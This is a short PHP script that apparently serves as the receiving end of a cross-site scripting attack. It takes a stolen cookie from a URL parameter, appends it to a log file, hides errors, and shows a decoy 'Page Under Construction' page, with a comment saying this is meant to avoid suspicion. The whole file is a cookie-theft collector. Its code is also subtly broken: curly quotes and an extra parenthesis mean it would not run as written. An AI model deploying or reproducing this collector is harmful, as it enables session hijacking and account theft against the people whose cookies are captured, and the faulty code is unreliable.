<?php
    error_reporting(0); #turn off all error reporting
    
    $cookie = $_GET['cc']; # Request to log 
    
    $file = ‘_cc_.txt’; #the log file
    $handle = fopen($file,"a"); # Open log file in append mode
    fwrite($handle,$cookie."\n")); # Append the cookie
    fclose($handle); # Append the cookie
    
    echo ‘<h1>Page Under Construction</h1>’; # Trying to avoid suspicion. 
